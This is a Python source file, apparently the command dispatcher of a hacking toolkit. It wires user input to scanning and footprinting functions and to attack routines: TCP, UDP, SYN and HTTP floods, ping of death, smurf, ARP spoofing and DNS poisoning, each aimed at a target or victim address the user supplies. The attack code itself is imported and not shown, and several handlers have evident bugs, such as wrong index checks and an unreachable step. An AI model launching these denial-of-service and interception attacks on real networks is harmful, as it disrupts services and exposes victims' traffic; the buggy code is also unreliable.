from scan import portscan, pingsweep, detect, webfp
from scan.monitor import Sniffer
from attack import dos
from attack.mitm import ARPAttack, dns_poisoning
from . import validity, style
from .consts import OpCommands
import sys, os
sys.path.append('/home/stormrider/.local/lib/python3.8/site-packages')
from tabulate import tabulate

def get_timeout(data):
    if len(data) == 3:
        if data[3].isnumeric():
            return data[3]
    else:
        return None

def output_msg(message):
    print(style.fg.lightblue)
    print(message)

def error_msg(message):
    print(style.fg.red)
    print(message)


port_protocols = ('tcp', 'TCP', 'udp', 'UDP')
INVALID_PARAM = 'Invalid parameters'
ATTACK_START = 'Executing attack...'
ATTACK_END = 'Attack ended'
QUIT_ATTACK = 'q'

def scans_handler(data):
    if data[0] == OpCommands.PORT_SCAN:
        if len(data) == 3 and validity.check_ip_address(data[1]) and data[2] in port_protocols:
            proto = portscan.TCP if data[2] == "tcp" else portscan.UDP
            scanner = portscan.PortScanner(data[1])
            scanner.scan(protocol=proto, output=True)
        else:
            error_msg ("Invalid IP address or protocol")
    elif data[0] == OpCommands.PING_SWEEP:
        if len(data) == 2 and validity.check_ip_address(data[1]):
            ps = pingsweep.PingSweep(data[1])
            output_msg("Scanning for available machines")
            ps.ping_sweep((1,255), True)
        else:
            error_msg ("Invalid network IP address")
    elif data[0] == OpCommands.SNIFFER:
        if len (data) > 1:
            error_msg ("Unknown parameters")
        else:
            Sniffer().start()
    elif data[0] == OpCommands.SCAN_IP:
        if len(data) >= 2:
            timeout = int(data[2]) if len(data) == 3 else None
            exceptions = detect.detect_exceptional_ip(data[1], timeout)
            if len(exceptions) > 0:
                output_msg("Exceptional addresses:")
            else:
                output_msg("No exceptions were found.")
        else:
            error_msg (INVALID_PARAM)
    elif data[0] == OpCommands.SCAN_ARP:
        output_msg("Scanning suspect MAC Addresses...")
        suspects =  detect.scan_arp_table()
        output_msg("Suspects:")
        if len(suspects) > 0:
            for mac in suspects:
                output_msg (mac)
        else:
            output_msg ("No suspects are found")
    elif data[0] == OpCommands.FOOTPRINT:
        try:
            if len(data) == 2:
                output_msg("Gathering information...")
                print('')
                output_msg(tabulate(webfp.check_http_methods(data[1]), headers=["Method", "Code", "Reason"]))
                print('')
                output_msg(tabulate(webfp.check_http_headers(data[1]), headers=["Header", "Response"]))
                print('')
                output_msg(tabulate(webfp.check_http_security_headers(data[1], None), headers=["Security header", "Response"]))
                print ('')
            else:
                error_msg(INVALID_PARAM)
        except:
            error_msg("Server footprint failed! Make sure URL is viable")
    elif data[0] == OpCommands.BANNER_GRAB:
        if len(data) == 2:
            output_msg (webfp.grab_banner(data[1], 80))
        else:
            error_msg(INVALID_PARAM)
    else:
        return False

    return True

def flood(data, type):
    if len(data) >= 2 and validity.check_ip_address(data[1]) and data[2].isnumeric():
        timeout = int(data[3]) if len(data) == 4 and data[3].isnumeric() else None
        output_msg(ATTACK_START)
        res = False
        if type == OpCommands.TCP_FLOOD:
            res = dos.tcp_flood_attack(data[1], int(data[2]), timeout)
        elif type == OpCommands.UDP_FLOOD:
            res = dos.udp_flood_attack(data[1], int(data[2]), timeout)
        elif type == OpCommands.SYN_FLOOD:
            res = dos.syn_flood_attack(data[1], int(data[2]), timeout)
        elif type == OpCommands.HTTP_FLOOD:
            res = dos.http_flood_attack(data[1], int(data[2]), timeout)
        if not res:
            error_msg('Connection error occurred. Make sure target machine is listening to the given port')
        else:
            output_msg(ATTACK_END)
    else:
        error_msg(INVALID_PARAM)

def icmp_attacks(data, type):
    if len(data) >= 2 and validity.check_ip_address(data[1]):
        timeout = int(data[2]) if len(data) == 3 and data[2].isnumeric() else None
        if type == OpCommands.PING_OF_DEATH:
            dos.ping_of_death(data[1], True, timeout)
        else:
            dos.smurf_attack(data[1], timeout)
    else:
        error_msg(INVALID_PARAM)

def dos_handler(data):
    if data[0] == OpCommands.TCP_FLOOD:
        flood(data, data[0])
    elif data[0] == OpCommands.SYN_FLOOD:
        flood(data, data[0])
    elif data[0] == OpCommands.UDP_FLOOD:
        flood(data, data[0])
    elif data[0] == OpCommands.PING_OF_DEATH:
        icmp_attacks(data, data[0])
    elif data[0] == OpCommands.SMURF_ATTACK:
        icmp_attacks(data, data[0])
    elif data[0] == OpCommands.HTTP_FLOOD:
        flood(data, data[0])
    elif data[0] == OpCommands.SLOWLORIS:
        pass
    else:
        return False

    return True

def arp_attack_option():
    current = 0
    check_input = \
        lambda data: len(data) == 2 and validity.check_mac_address(data[0]) and validity.check_ip_address(data[1])
    gateway = victim = attacker = None
    while current < 2:
        print(style.fg.lightgreen)
        if current == 0:
            gateway = input("Insert Gateway's MAC and IP: ").split(' ')
            if gateway[0] == QUIT_ATTACK:
                break
            if check_input(gateway):
                current += 1
            else:
                error_msg(INVALID_PARAM)
        if current == 1:
            victim = input("Insert victim's MAC and IP: ").split(' ')
            if victim[0] == QUIT_ATTACK:
                break
            if check_input(victim):
                current += 1
            else:
                error_msg(INVALID_PARAM)
        if current == 2:
            attacker = input("Insert your MAC address ")
            if attacker == QUIT_ATTACK:
                break
            if validity.check_mac_address(attacker):
                current += 1
            else:
                error_msg(INVALID_PARAM)
        if current == 2:
            output_msg(ATTACK_START)
            attack = ARPAttack(gateway, victim, attacker)
            attack.start_poisoning()
            while True:
                if input("Insert {} to quit the attack".format(QUIT_ATTACK)) == QUIT_ATTACK:
                    attack.stop_poisoning()
                    output_msg(ATTACK_END)
                    break

def dns_option():
    current = 0
    server = domain = None
    while current < 2:
        if current == 0:
            server = input("Insert DNS server address: ")
            if validity.check_ip_address(server):
                current += 1
            else:
                error_msg(INVALID_PARAM)
        if current == 1:
            domain = input("Insert domain name and address: ")
            if validity.check_ip_address(domain[1]):
                current += 1
            else:
                error_msg(INVALID_PARAM)
        if current == 2:
            output_msg(ATTACK_START)
            dns_poisoning(server, domain[0], domain[1])
    output_msg (ATTACK_END)

def mitm_handler(data):
    if data[0] == OpCommands.ARP_SPOOFING:
        arp_attack_option()
    elif data[0] == OpCommands.DNS_POISONING:
        if len(data) == 1:
            dns_option()
    else:
        return False

    return True
